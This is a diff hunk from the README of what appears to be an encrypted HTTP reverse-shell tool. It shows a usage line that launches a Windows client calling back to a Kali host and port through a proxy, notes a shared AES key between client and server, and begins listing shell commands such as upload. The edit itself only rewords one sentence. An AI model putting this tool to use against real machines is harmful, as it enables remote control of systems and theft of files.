@@ -27,7 +27,7 @@ C:\client_shell_http.exe <kali_ip> <kali_port> <proxy_address> <Proxy_port>
 
 ```get-pip.py``` To install pip for python2 (after deprecation). Reference: https://bootstrap.pypa.io/
 
-NB: If changing the ```secret``` AES encryption key, please ensure you change both the client and server scripts to match.
+NB: If changing the ```secret``` AES encryption key, ensure you change both the client and server scripts to match.
 
 ## COMMANDS:
 ```upload [filename]```
